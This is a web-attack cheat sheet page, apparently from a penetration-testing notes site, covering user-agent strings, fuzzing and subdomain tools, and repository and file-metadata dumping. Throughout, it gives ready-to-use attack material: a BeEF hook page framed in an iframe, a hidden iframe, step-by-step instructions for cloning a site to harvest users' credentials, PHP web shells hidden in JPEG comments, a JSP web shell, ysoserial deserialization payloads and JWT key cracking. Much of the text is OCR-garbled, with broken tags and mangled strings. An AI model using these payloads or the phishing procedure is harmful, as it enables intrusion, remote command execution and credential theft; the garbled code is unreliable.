---
title: Web
sidebar: mydoc_sidebar
permalink: web.html
folder: mydoc
---


# the Web

## Common user-agents

### Internet Explorer (6.0, 7.0, 8.0, 9.0)

| **Agent** | **Version** |
| :--- | :--- |
| Mozilla/4.0 \(compatible; MSIE 6.0; Windows NT 5.1; SV1\) | IE 6.0/WinXP 32-bit |
| Mozilla/ 4. 0 \(compatible; MSIE 7. 0; Windows NT 5.1; SV1; .NET CLR 2.0.50-2 7 \) | IE 7.0/WinXP 32-bit |
| Mozilla/4.0 \(compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 \(compatible; MSIE 6.0; Windows NT 5.1; SV1\) ; .NET CLR 3.5.30 7 29\) | IE 8.0/WinVista 32-bit |
| Mozilla/5.0 \(compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0\) | IE 9.0/Win7 32-bit |
| Mozilla/5.0 \(compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0\) | IE 9.0/Win7 64-bit |

### Firefox \(5.0, 13.0, 17.0\)

| **Agent** | **Version** |
| :--- | :--- |
| Mozilla/5.0 \(Windows NT 6.1; WOW64; rv:5.0\) Gecko/20100101 Firefox/5.0 | Firefox 5.0/Win7 64-bit |
| Mozilla/5.0 \(Windows NT 5.1; rv:13.0\) Gecko/20100101 Firefox/13.0.1 | Firefox 13.0/WinXP 32-bit |
| Mozilla/5.0 \(Windows NT 6.1; WOW64; rv:17.01 Gecko/20100101 Firefox/17.0 | Firefox 17/Win7 64-bit |
| Mozilla/5.0 \(X11; Ubuntu; Linux x86\_64; rv:17.0\) Gecko/20100101 Firefox/17.0 | Firefox 17.0/Linux |
| Mozilla/5.0 \(Macintosh; Intel Mac OS X 10.7; rv:17. 0\) Gecko/20100101 Firefox/1 7 .0 | Firefox 17.0/MacOSX 10.7 |
| Mozilla/5.0 \(Macintosh; Intel Mac OS X 10.8; rv:17.0\) Gecko/20100101 Firefox/17.0 | Firefox 17.0/MacOSX 10.8 |

### Chrome \(Generic 13.0\)

| **Agent** | **Version** |
| :--- | :--- |
| Mozilla/5.0 \(Windows NT 5.1\) AppleWebKit/537.11 \(KHTML, like Gecko\) Chrome/23.0.1271.97 Safari/53-.11 | Chrome Generic/WinXP |
| Mozilla/5.0 \(Windows NT 6.1\) AppleWebKit/537 .11 \(KHTl~L, like Gecko\) Chrome/23.0.1271.97 Safari/53-.11 | Chrome Generic/Win7 |
| Mozilla/5.0 \(X11; Linux x86 64\) AppleWebKit/537 .11 \(KHTl~L, like Gecko\) Chrome/23.0.1271.97 Safari/53 7 .11 | Chrome Generic/Linux |
| Mozilla/5.0 \(Macintosh; Intel Mac OS X 10 8 2\) AppleWebKit/537.11 \(KHTML, like Gecko\) Chrome/23.0.12-1.101 Safari/537.11 | Chrome Generic/MacOSX |
| Mozilla/5.0 \(Windows NT 6.1; WOW64\) AppleWebKit/535.1 \(KHTML, like Gecko\) Chrome/13.0.782.112 Safari/535.1 | Chrome 13.0/Win7 64-bit |

### Safari \(6.0\)

| **Agent** | **Version** |
| :--- | :--- |
| Mozilla/5.0 \(Macintosh; Intel Mac OS X 10 ~ 5\) AppleWebKit/536.26.17 \(KHTML, like Ge~ko\) Version/6.0.2 Safari/536.26.17 | Safari 6.0/MacOSX |

### Mobile safari \(4.0 & 6.0\)

| **Agent** | **Version** |
| :--- | :--- |
| Mozilla/5.0 \(iPad; CPU OS 6 0 1 like Mac OS X\) AppleWebKit/536.26 \(KHTML, like Gecko\) Version/6.0 Mobile/10A523 Safari/8536.25 | Mobile Safari 6.0/iOS \(iPad\) |
| Mozilla/5.0 \(iPhone; CPU iPhone OS 6 0 1 like l~ac OS X\) AppleWebKit/536.26 \(KHTML, like Gecko\) Version/6.0 Mobile/10A523 Safari/8536.25 | Mobile Safari 6.0/iOS \(iPhone\) |
| Mozilla/5.0 \(Linux; U; Android 2.2; fr-fr; Desire A8181 Build/FRF91\) App3leWebKit/53.1 \(KHTML, like Gecko\) Version/4. 0 Mobile Safari/533.1 | Mobile Safari 4.0/Android |

## HTML language

### beef code embedded in iframe


```text
!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
html
head.
title Campaign Title· /title
script
var commandModuleStr = ' script src= "' + window.location.protocol +
'//' + window. location. host + ':8080/hook.js"
type="text/javascript" \/script.';
document.write(commandModuleStr);
//Site refresh=window.setTimeout(function() {window.location.href='http://ww
w.google.com/'},20000);
/script
/head
frameset rows="*,1px"
frame src="http://www.google.com/" frameborder=O
noresize="noresize" /
frame src="/e" frarneborder=O scrolling=no noresize=noresize /
/frameset
/html
```

### Embedded java applet code \(\* must be placed in &lt;body&gt;\)

```text
applet archive="legit.jar" code="This is a legit applet" width="1"
height="1"
/applet
```

### Embedded iframe

```text
iframe src="http://1.1.1.1" width="0" height="0" frameborder="0"
tabindex="-1" title="empty" style="visibility:hidden;display:none"
/iframe
```

### Firefox connection methods

```text
ASCII - Base64 javascript:btoa("ascii str")
Base64 - ASCII javascript:atob("base64==")
ASCII - URI javascript:encodeURI(" script "}
URI - ASCII javascript:decodeURI("%3cscript%3E")
```

## Wget command

### Token session recording

```text
wget -q --save-cookies=cookie.txt --keep-session-cookies --post-
data="username: admin&password=pass&Login=Login" http://url/login. php
```

## Curl command

### Get web page headers by changing user agent

```text
curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)"
http:// ip
```

### Get the page after authentication

```text
curl -u user:pass -o outfile https://login.bob.com
```

### Ftp command

```text
curl ftp://user:pass@bob.com/directory/
```

### Check different files

```text
curl http://bob.com/file[l-10].txt
```

### Creating Basic authentication in apache2

```text
The steps below will clone a website and redirect after 3 seconds to
another page requiring basic authentication. It has proven very useful for
Collecting credentials during social engineering engagements.

1. Start Social Engineering Toolkit (SET)
     /pentest/exploits/set/./set
2. Through SET, use the 'Website Attack Vector' menu to clone yours
     preferred website. 'Do not close SET'
3. In a new terminal create a new directory (lowercase L)
     mkdir /var/www/1
4. Browse to SET directory and copy the cloned site
     cd /pentest/exploits/set/src/web clone/site/template/
     cp index.html /var/www/index.html
     cp index.html /var/www/1/index.html
5. Open /var/www/index.html and add tag between head tags
     meta http-equiv="refresh"
content="3;url=http:// domainlip /1/index.html"/
6. Create blank password file to be used for basic auth
     touch /etc/apache2/.htpasswd
7. Open /etc/apache2/sites-available/default and add:
     Directory /var/www/1
         AuthType Basic
         AuthName "PORTAL LOGIN BANNER"
         AuthUserFile /etc/apache2/.htpasswd
         Require user test
     /Directory
8. Start Apache2
     /etc/init.d/apache2 start
9. Start Wireshark and add the filter:
     http.authbasic
10. Send the following link to your target users
     http://domainlip/index.html
```

## Automate the photo process from the web page

### Using nmap

```text
Install dependencies:
     wget http://wkhtmltopdf.googlecode.com/files/wkhtmltoimage-0.11.0 rc1-
     static-i386.tar.bz2
     tar -jxvf wkhtmltoimage-0.11.0 rc1-statlc-i386.tar.bz2
     cp wkhtmltoimage-i386 /usr/local/bin/

Install Nmap module:
     git clone git://github.com/SpiderLabs/Nmap-Tools.git
     cd Nmap-Tools/NSE/
     cp http-screenshot.nse /usr/local/share/nmap/scripts/
     nmap --script-updatedb

OS/version detection using screenshot script (screenshots saved as .png):
     nmap -A -script=http-screenshot -p80,443 1.1.1.0/24 -oA nmap-
     screengrab

Script will generate HTML preview page with all screenshots:
#!/bin/bash
printf "HTHL.- BODY BR"
preview.html
ls -1 '.png I awk -F : ' {print $1":"$2"\n BR- IMG SRC=\""$1"%3A"$2"\"
width=400 BR BR ")' preview. html
printf " /BODY /HTML. " preview. html
```

### Peepingtom command

```text
Installation Dependencies:
Download Phantomjs
     https://phantomjs.googlecode.com/files/phantomjs-1.9.2-linux-x86_64.tar.bz2
Download PeepingTom
     git clone https://bitbucket.org/LaNMaSteR53/peepingtom.git
Extract and copy phantomjs from phantomjs-1.9.2-linux-x86 64.tar.bz2 and
copy to peepingtom directory
Run PeepingTom
     python peepingtom.py http:// mytarget.com
```


## Injection of different payloads with wfuzz

```text
wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt -hc 404 https://www.example.com/?req=search_site&searchTitle=FUZZ
```

## Guess different files with specific extensions with wfuzz

```text
wfuzz -w /usr/share/wordlists/big.txt -u http://admirer.htb/admin/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

## guess at POST requests

```text
wfuzz -X POST -u ''http://quick.htb/login.php' -w elist.txt -d 'email=FUZZ&password=123456' -hc 200 -c
```

## Guess web paths with ffuf

```text
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.10.10/FUZZ
```

## Guess subdomain with gobuster

```text
gobuster dns -t 50 -d pubg.com -w ~/seclists/Dir/subdomains.dat
```

Subdomain guess with ffuf

```text
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://
example.com/ -H "Host: FUZZ.example.com"
```

## Find subdomain based on certificates


```text
https://crt.sh/
```

و 

```text
assetfinder --subs-only <domain> | httprobe
```

## Injection of php inside jpeg

```text
giftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' me.jpg
```

## Exploit deserialization of Java programs

```text
java -jar ysoserial.jar CommonsBeanutils1 'COMMAND' | base64 -w0
```

## Famous web shells

```text
https://github.com/TheBinitGhimire/Web-Shells
```

## Extracting the structure of folders and files from .git

https://github.com/arthaud/git-dumper

```text
./git-dumper.py http://example.com/.git/ example.com
```

## Extract information from .git

https://github.com/internetwache/GitTools

```text
./extractor.sh /tmp/mygitrepo /tmp/mygitrepodump
```

## Extract information from .DS_Store

```text
1- find structure
python2.7 ds_store_exp.py http://poo.htb/.DS_Store
2-enum in found path
java -jar iis_shortname_scanner.jar 2 20 http://poo.htb/dev/dca66d38fd916317687e1390a420c3fc/db/
```

## Extracting page parameters

```text
python3 paramspider.py --domain bugcrowd.com --exclude woff,css,js,png,svg,php,jpg --output bugcrowd.txt
```

## Examining the structure of parameters based on patterns of vulnerabilities

```text
gf xss domain.txt
gf potential domain.txt
```

## Guess the jwt symmetric encryption key

```text
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6

Or


```


## public key guess jwt asymmetric encryption

```text
docker run --rm -it portswigger/sig2n <token1> <token2>
```

## Create web shell jpg

```text
giftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' meme.jpg
```

## Create web shell jsp

```text
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```



{% include links.html %}
